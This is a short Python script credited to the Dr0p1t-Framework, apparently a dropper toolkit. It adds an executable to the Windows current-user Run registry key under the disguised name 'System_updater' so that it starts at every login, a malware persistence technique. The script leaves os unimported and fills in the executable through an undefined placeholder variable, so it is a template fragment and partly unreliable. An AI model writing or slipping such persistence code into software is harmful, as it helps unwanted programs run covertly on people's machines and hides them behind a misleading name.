#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to startup registry key
#Start
from winreg import *
def addStartup(exe):
    fp = os.path.dirname(os.path.realpath(exe))
    new_file_path = fp + "\\" + exe
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "System_updater",0,REG_SZ, new_file_path)

addStartup(File)
